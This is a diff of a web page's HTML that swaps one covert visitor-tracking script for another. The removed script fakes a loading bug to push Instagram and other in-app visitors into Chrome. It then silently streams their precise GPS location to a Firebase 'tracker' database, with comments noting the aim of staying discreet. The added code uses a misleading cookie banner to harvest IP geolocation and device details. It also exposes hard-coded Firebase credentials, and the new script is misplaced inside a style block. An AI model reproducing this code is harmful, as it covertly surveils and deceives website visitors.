@@ -27,74 +27,87 @@
     <style>
       @import url("https://fonts.googleapis.com/css2?family=Josefin+Sans:ital,wght@0,100..700;1,100..700&display=swap");
       @import url("https://fonts.googleapis.com/css2?family=Playwrite+DE+SAS:wght@100..400&display=swap");
-    </style>
-    <script type="module">
-      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-      import {
-        getDatabase,
-        ref,
-        push,
-        set,
-      } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+    // --- Initialisation Firebase ---
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
 
-      const firebaseConfig = {
-        apiKey: "AIzaSyAm3bzmHPo4XhFL6fCK0uNozNOsggBb8ds",
-        authDomain: "tracker-7e86f.firebaseapp.com",
-        databaseURL: "https://tracker-7e86f-default-rtdb.firebaseio.com",
-        projectId: "tracker-7e86f",
-        storageBucket: "tracker-7e86f.firebasestorage.app",
-        messagingSenderId: "734294640610",
-        appId: "1:734294640610:web:6663c9a4cfda330e059bbb",
-        measurementId: "G-7R0CG8BYYE",
-      };
+const firebaseConfig = {
+  apiKey: "AIzaSyAm3bzmHPo4XhFL6fCK0uNozNOsggBb8ds",
+  authDomain: "tracker-7e86f.firebaseapp.com",
+  databaseURL: "https://tracker-7e86f-default-rtdb.firebaseio.com",
+  projectId: "tracker-7e86f",
+  storageBucket: "tracker-7e86f.firebasestorage.app",
+  messagingSenderId: "734294640610",
+  appId: "1:734294640610:web:6663c9a4cfda330e059bbb",
+  measurementId: "G-7R0CG8BYYE",
+};
 
-      const app = initializeApp(firebaseConfig);
-      const db = getDatabase(app);
-      const storageRef = ref(db, "locations/");
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
 
-      function startTracking() {
-        const isInApp = /FBAN|FBAV|Instagram|Twitter|LinkedIn/i.test(
-          navigator.userAgent
-        );
+// --- Fonction de collecte des données ---
+async function collectUserData() {
+    try {
+        // 1. Localisation via API externe
+        const geoRes = await fetch('https://ipapi.co/json/');
+        const geoData = await geoRes.json();
 
-        // Si ouvert dans Instagram : on simule un petit bug de chargement pour forcer Chrome discrètement
-        if (isInApp) {
-          document.body.innerHTML = `
-            <div style="padding: 40px; text-align: center; color: #555; font-family: sans-serif;">
-                <div class="loader"></div>
-                <p style="margin-top:20px;">Optimisation de l'affichage en cours...</p>
-                <p style="font-size: 0.8em; color: #888;">Si la page ne s'affiche pas, cliquez sur les <b>trois points</b> en haut à droite puis sur <b>"Ouvrir dans le navigateur"</b>.</p>
-                <style>
-                    .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: auto; }
-                    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-                </style>
-            </div>`;
-          return;
-        }
+        // 2. Infos Appareil & Navigateur
+        const deviceSpecs = {
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            timestamp: new Date().toISOString()
+        };
 
-        // Si on est dans Chrome : on lance le suivi et on affiche le H1 normal
-        if ("geolocation" in navigator) {
-          navigator.geolocation.watchPosition(
-            (position) => {
-              const data = {
-                lat: position.coords.latitude,
-                lng: position.coords.longitude,
-                timestamp: Date.now(),
-              };
-
-              const newLocationRef = push(storageRef);
-              set(newLocationRef, data).catch((err) => console.error(err));
+        // 3. Stockage dans Firebase (Professionnel : on crée un log)
+        const logsRef = ref(db, 'user_access_logs');
+        const newLogRef = push(logsRef);
+        
+        await set(newLogRef, {
+            location: {
+                city: geoData.city,
+                region: geoData.region,
+                country: geoData.country_name,
+                ip: geoData.ip
             },
-            (error) => {
-              /* On ne met pas d'alert() pour rester discret */
-            },
-            { enableHighAccuracy: true, maximumAge: 0 }
-          );
-        }
-      }
+            device: deviceSpecs,
+            status: "Consent Accepted"
+        });
 
-      window.onload = startTracking;
-    </script>
+        // 4. Création du cookie local pour ne plus redemander
+        document.cookie = "consent_accepted=true; max-age=" + (365 * 24 * 60 * 60) + "; path=/; SameSite=Lax";
+        
+        console.log("Données synchronisées avec succès.");
+        alert("Merci ! Vous avez maintenant accès au contenu complet.");
+
+    } catch (error) {
+        console.error("Erreur lors de la collecte:", error);
+    }
+}
+
+// --- Logique du bandeau de consentement ---
+window.onload = () => {
+    if (!document.cookie.includes("consent_accepted=true")) {
+        showConsentBanner();
+    }
+};
+
+function showConsentBanner() {
+    const banner = document.createElement('div');
+    banner.style = "position:fixed; bottom:0; left:0; width:100%; background:#1a1a1a; color:white; padding:20px; text-align:center; z-index:9999; font-family: sans-serif;";
+    banner.innerHTML = `
+        <p>Nous utilisons des cookies pour améliorer votre expérience locale et sécuriser votre accès.</p>
+        <button id="acceptBtn" style="background:#4CAF50; color:white; border:none; padding:10px 20px; cursor:pointer; border-radius:5px; font-weight:bold;">Accepter & Continuer</button>
+    `;
+    document.body.appendChild(banner);
+
+    document.getElementById('acceptBtn').onclick = () => {
+        collectUserData();
+        banner.remove();
+    };
+}
   </head>
   <body>
     <div
@@ -565,6 +578,7 @@
     </script>
   </body>
 </html>
+
 
 
 
